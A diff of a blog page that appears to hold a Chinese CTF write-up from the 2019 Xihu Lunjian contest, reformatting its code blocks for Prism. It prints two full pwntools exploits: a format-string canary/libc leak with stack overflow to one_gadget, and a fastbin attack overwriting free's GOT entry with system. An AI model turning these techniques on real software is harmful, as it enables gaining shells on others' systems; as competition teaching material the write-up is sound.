@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="由于最近忙的多西很多，导致2019西湖论剑CTF忘记报名了，只能用队友的账号上去做了一下，赛题体验良好，题目还是很中规中矩的，虽然依旧是被吊锤(脸红)。比赛是从上午九点打到晚上九点，时间可以说是很短了，这边由于做pwn调试的时候花费了大量的时间和精力，导致最后没有耐心去看其它题目了(菜！！！)，贴一下做出来的题目。">
@@ -100,7 +100,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -332,16 +332,84 @@
 <p><img src="./%E6%BA%A2%E5%87%BA.png" alt="image">  </p>
 <p>这边发现程序存在溢出，猜测是利用格式化字符串泄露canary，之后溢出，构造rop或者ret2libc来getshell。  </p>
 <p>贴下脚本:  </p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process('./story')</span><br><span class="line"><span class="attribute">p</span>=remote('ctf2.linkedbyx.com',10655)</span><br><span class="line"><span class="comment">##gdb.attach(p,'''</span></span><br><span class="line"><span class="comment">#    break *0x0000000000400A53</span></span><br><span class="line"><span class="comment">#    break *0x0000000000400A1C</span></span><br><span class="line"><span class="comment">#    continue</span></span><br><span class="line"><span class="comment">#''')</span></span><br><span class="line"><span class="attribute">libc</span>=ELF('./libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">p.recvuntil(<span class="string">'Please Tell Your ID:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%25$lx%15$lx'</span>)x`</span><br><span class="line">p.recvuntil(<span class="string">'Hello '</span>)</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line"><span class="attribute">libc_main</span>=int(p.recv(12),16)-240</span><br><span class="line"><span class="attribute">libc_base</span>=libc_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="attribute">bin_sh</span>=libc.search('/bin/sh').next()+libc_base</span><br><span class="line"><span class="attribute">system</span>=libc.symbols[<span class="string">'system'</span>]+libc_base</span><br><span class="line"><span class="comment">#print hex(libc_system)</span></span><br><span class="line"><span class="attribute">canary</span>=int(p.recvline(),16)</span><br><span class="line"><span class="comment">#print canary</span></span><br><span class="line">p.recvuntil(<span class="string">'Tell me the size of your story:'</span>)</span><br><span class="line">p.sendline(<span class="string">'129'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You can speak your story:'</span>)</span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*136+p64(canary)+'a'*8+p64(0xf1147+libc_base)+100*p64(0x0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这边rop用的是one_gadget，注意需要满足[rsp+0x??]为空的条件，这里可以利用大范围高字节溢出，把rbp-4之后的地址全部淹没为空。  </p>
+<pre><code>from pwn import *
+p=process(&#39;./story&#39;)
+p=remote(&#39;ctf2.linkedbyx.com&#39;,10655)
+##gdb.attach(p,&#39;&#39;&#39;
+#    break *0x0000000000400A53
+#    break *0x0000000000400A1C
+#    continue
+#&#39;&#39;&#39;)
+libc=ELF(&#39;./libc6_2.23-0ubuntu10_amd64.so&#39;)
+p.recvuntil(&#39;Please Tell Your ID:&#39;)
+p.sendline(&#39;%25$lx%15$lx&#39;)x`
+p.recvuntil(&#39;Hello &#39;)
+#print p.recvline()
+libc_main=int(p.recv(12),16)-240
+libc_base=libc_main-libc.symbols[&#39;__libc_start_main&#39;]
+bin_sh=libc.search(&#39;/bin/sh&#39;).next()+libc_base
+system=libc.symbols[&#39;system&#39;]+libc_base
+#print hex(libc_system)
+canary=int(p.recvline(),16)
+#print canary
+p.recvuntil(&#39;Tell me the size of your story:&#39;)
+p.sendline(&#39;129&#39;)
+p.recvuntil(&#39;You can speak your story:&#39;)
+payload=&#39;a&#39;*136+p64(canary)+&#39;a&#39;*8+p64(0xf1147+libc_base)+100*p64(0x0)
+p.sendline(payload)
+p.interactive()</code></pre><p>这边rop用的是one_gadget，注意需要满足[rsp+0x??]为空的条件，这里可以利用大范围高字节溢出，把rbp-4之后的地址全部淹没为空。  </p>
 <p><img src="./getshell.png" alt="image">  </p>
 <h2 id="PWN3-noinfoLeak"><a href="#PWN3-noinfoLeak" class="headerlink" title="PWN3 noinfoLeak"></a>PWN3 noinfoLeak</h2><p>看保护发现只有pie没有开，不用猜都知道肯定是堆题。程序本来的符号表是被裁掉的，这边通过分析程序功能补全了一下。  </p>
 <p><img src="./%E7%AC%A6%E5%8F%B7.png" alt="image">  </p>
 <p>程序主要有三个功能，malloc、free、input，分配的堆块的大小和地址存储在bss上的list中。通过静态分析可以发现free没有对chunk进行检查，所以这边有个doublefree，input_list函数同样没有对chunk是否已经free进行检查，导致这边又有个uaf。<br>看到这边单纯的我想到的思路就是通过uaf改写free chunk的fd指向，通过fastbinAttack改写全局list内容，然后利用程序本身的input_list功能进行got覆写，最后one_gadget一把梭结束战斗。<br>然鹅，我还是低估了出题人的险恶用心(拍桌！！！)，因为，这题，居然没法直接泄露。。。<br>话说回来，万变不离其宗，此题也只是无法直接泄露，都能任意地址写了，还怕没法泄露地址的咩<del>改个got表就吼了</del>。<br>贴下脚本:</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">"./noinfoleak"</span>)</span><br><span class="line"><span class="comment">#p = remote("ctf1.linkedbyx.com" , 10216)</span></span><br><span class="line">elf = ELF(<span class="string">"./noinfoleak"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">sla = lambda c : p.sendlineafter(<span class="string">"&gt;"</span> , str(c))</span><br><span class="line">sa = lambda c : p.sendafter(<span class="string">"&gt;"</span> , str(c))</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">add</span>(size , content):</span><br><span class="line">	sla(1)</span><br><span class="line">	sla(size)</span><br><span class="line">	sa(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	sla(2)</span><br><span class="line">	sla(idx)</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">edit</span>(idx , content):</span><br><span class="line">	sla(3)</span><br><span class="line">	sla(idx)</span><br><span class="line">	sa(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack to control note_list </span></span><br><span class="line">stdin = 0x601090</span><br><span class="line"><span class="builtin-name">add</span>(0x60 , <span class="string">"padding"</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x60 , <span class="string">"padding"</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x60 , <span class="string">"padding"</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x60 , <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="builtin-name">edit</span>(0 , p64(stdin + 5 - 0x8))</span><br><span class="line"><span class="builtin-name">add</span>(0x60 , <span class="string">"padding"</span>) # clear</span><br><span class="line">payload = <span class="string">"a"</span> * 3 + p64(elf.got[<span class="string">"free"</span>]) + p64(0x8) + p64(elf.got[<span class="string">"read"</span>])  + p64(0x8)</span><br><span class="line"><span class="builtin-name">add</span>(0x60 , payload)</span><br><span class="line"><span class="builtin-name">edit</span>(0 , p64(elf.plt[<span class="string">"puts"</span>] ))</span><br><span class="line">delete(1)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>).ljust(8 , <span class="string">"\x00"</span>))</span><br><span class="line">libc.address = read_addr - libc.sym[<span class="string">"read"</span>]</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line"><span class="builtin-name">edit</span>(0 , p64(libc.sym[<span class="string">"system"</span>]))</span><br><span class="line">delete(3)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># leak libc </span></span><br><span class="line"><span class="comment"># modify free to system for getshell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
+context.log_level = &quot;debug&quot;
+p = process(&quot;./noinfoleak&quot;)
+#p = remote(&quot;ctf1.linkedbyx.com&quot; , 10216)
+elf = ELF(&quot;./noinfoleak&quot;)
+libc = elf.libc
 
-<p><img src="./pwn3_get_shell.png" alt="image">  </p>
+sla = lambda c : p.sendlineafter(&quot;&gt;&quot; , str(c))
+sa = lambda c : p.sendafter(&quot;&gt;&quot; , str(c))
+
+def add(size , content):
+    sla(1)
+    sla(size)
+    sa(content)
+
+def delete(idx):
+    sla(2)
+    sla(idx)
+
+def edit(idx , content):
+    sla(3)
+    sla(idx)
+    sa(content)
+
+# fastbin attack to control note_list 
+stdin = 0x601090
+add(0x60 , &quot;padding&quot;)
+add(0x60 , &quot;padding&quot;)
+add(0x60 , &quot;padding&quot;)
+add(0x60 , &quot;/bin/sh\x00&quot;)
+
+delete(0)
+gdb.attach(p)
+edit(0 , p64(stdin + 5 - 0x8))
+add(0x60 , &quot;padding&quot;) # clear
+payload = &quot;a&quot; * 3 + p64(elf.got[&quot;free&quot;]) + p64(0x8) + p64(elf.got[&quot;read&quot;])  + p64(0x8)
+add(0x60 , payload)
+edit(0 , p64(elf.plt[&quot;puts&quot;] ))
+delete(1)
+read_addr = u64(p.recvuntil(&quot;\x7f&quot;).ljust(8 , &quot;\x00&quot;))
+libc.address = read_addr - libc.sym[&quot;read&quot;]
+log.info(&quot;libc : &quot; + hex(libc.address))
+edit(0 , p64(libc.sym[&quot;system&quot;]))
+delete(3)
+# gdb.attach(p)
+# leak libc 
+# modify free to system for getshell
+p.interactive()</code></pre><p><img src="./pwn3_get_shell.png" alt="image">  </p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>打一天时间还是太短了，有些题目来不及刚都，等着官方WP出了去复盘一波。  </p>
 
     </div>
@@ -448,6 +516,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
